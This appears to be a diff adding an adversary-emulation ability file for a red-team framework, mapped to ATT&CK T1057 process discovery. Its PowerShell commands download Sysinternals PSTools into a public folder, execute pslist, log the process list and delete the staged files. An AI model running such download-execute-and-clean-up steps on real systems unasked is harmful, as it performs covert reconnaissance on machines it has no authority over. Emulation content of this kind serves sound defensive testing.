@@ -1,0 +1,71 @@
+ability_id: cc191baa-7472-4386-a2f4-42f203f1acfd
+access: {}
+additional_info: {}
+buckets:
+- collection
+delete_payload: true
+description: Process discovery via SysInternals pstool
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: '$ps_url = "https://download.sysinternals.com/files/PSTools.zip";
+
+    $download_folder = "C:\Users\Public\";
+
+    $staging_folder = "C:\Users\Public\temp";
+
+    Start-BitsTransfer -Source $ps_url -Destination $download_folder;
+
+    Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;
+
+    iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;
+
+    Remove-Item $download_folder"PSTools.zip";
+
+    Remove-Item $staging_folder -Recurse'
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: '$ps_url = "https://download.sysinternals.com/files/PSTools.zip";
+
+    $download_folder = "C:\Users\Public\";
+
+    $staging_folder = "C:\Users\Public\temp";
+
+    Start-BitsTransfer -Source $ps_url -Destination $download_folder;
+
+    Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;
+
+    iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;
+
+    Remove-Item $download_folder"PSTools.zip";
+
+    Remove-Item $staging_folder -Recurse'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: SysInternals PSTool Process Discovery
+plugin: stockpile
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: collection
+technique_id: T1057
+technique_name: Process Discovery
